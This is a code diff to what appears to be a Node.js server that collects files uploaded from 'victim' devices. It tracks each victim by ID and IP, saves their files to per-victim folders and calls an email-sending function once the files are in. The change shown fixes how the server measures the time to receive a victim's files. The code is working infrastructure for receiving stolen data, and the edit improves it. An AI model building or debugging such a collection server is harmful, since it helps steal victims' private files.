@@ -70,9 +70,9 @@ async function checkAndSendEmail(victimId, victimFolder) {
 
     victimFiles[victimId] = files;
 
-    // Calculate and store the time taken to receive all files
-    const timeTaken = Date.now() - connectedDevices[victimId].connectionTime;
-    connectedDevices[victimId].totalUploadTime = timeTaken;  // Store the time in ms
+    // ✅ FIX: Calculate total transfer time from first chunk received
+    const timeTaken = Date.now() - connectedDevices[victimId].firstChunkTime;
+    connectedDevices[victimId].totalUploadTime = timeTaken;  // Store the actual transfer time in ms
     console.log(`Time to receive all files for ${victimId}: ${timeTaken / 1000} seconds`);
   }
 }
@@ -109,11 +109,15 @@ app.post('/upload', (req, res) => {
         ip: ip,
         connectionTime: Date.now(),  // Record connection time in milliseconds
         lastConnectionTime: new Date(),
+        firstChunkTime: null,  // ✅ FIX: Track first chunk received time
         filesTransferred: 0,
         fileList: [],
       };
-    } else {
-      connectedDevices[victimId].lastConnectionTime = new Date();
+    }
+
+    // ✅ FIX: Record the time of the first received chunk
+    if (!connectedDevices[victimId].firstChunkTime) {
+      connectedDevices[victimId].firstChunkTime = Date.now();
     }
 
     if (!victimFolders[victimId]) {
@@ -137,7 +141,6 @@ app.post('/upload', (req, res) => {
       victimFileCounts[victimId] += 1;
       connectedDevices[victimId].filesTransferred += 1;
 
-      // Add the file to the list only if it's not already there
       if (!connectedDevices[victimId].fileList.includes(filename)) {
         connectedDevices[victimId].fileList.push(filename);
       }
